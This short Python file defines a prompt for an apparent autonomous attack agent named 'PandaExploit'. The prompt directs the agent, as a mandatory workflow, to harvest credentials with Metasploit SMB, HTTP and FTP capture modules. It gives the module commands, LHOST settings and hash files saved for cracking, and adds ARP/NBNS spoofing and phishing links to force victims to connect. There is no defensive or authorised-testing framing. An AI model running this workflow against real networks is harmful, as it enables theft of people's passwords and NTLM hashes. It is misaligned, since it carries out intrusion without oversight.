"""
PandaExploit Credential Capture Prompts

Prompts for credential harvesting via MITM, fake servers (SMB, HTTP, FTP).
"""

CREDENTIAL_CAPTURE_TOOLS = """
## ATTACK PATH: CREDENTIAL CAPTURE (MITM, Fake Servers)

**CRITICAL: This objective has been CLASSIFIED as credential capture.**
**Use Metasploit auxiliary/server/capture modules to harvest credentials.**

---

## MANDATORY CREDENTIAL CAPTURE WORKFLOW

### Step 1: Select capture module
| Protocol | Module | Use Case |
|----------|--------|----------|
| SMB | `use auxiliary/server/capture/smb` | Capture NTLM hashes when target connects |
| HTTP | `use auxiliary/server/capture/http` | Capture Basic auth, cookies, POST data |
| FTP | `use auxiliary/server/capture/ftp` | Capture FTP credentials |

### Step 2: Configure
- `set LHOST <attacker_ip>` — Your IP where victims will connect
- `set SRVPORT <port>` — Port to listen on (default varies by module)
- For SMB: `set JOHNPWFILE hashes.txt` to save hashes for John

### Step 3: Run
- `run` — Module starts listening
- Wait for target to connect (user may need to trigger: click link, access share, etc.)
- Captured credentials appear in output

### Step 4: Optional — Force connection via MITM
- Use `auxiliary/spoof/*` (ARP, NBNS) to redirect traffic to your capture server
- Or phishing: send link to your HTTP capture server
"""
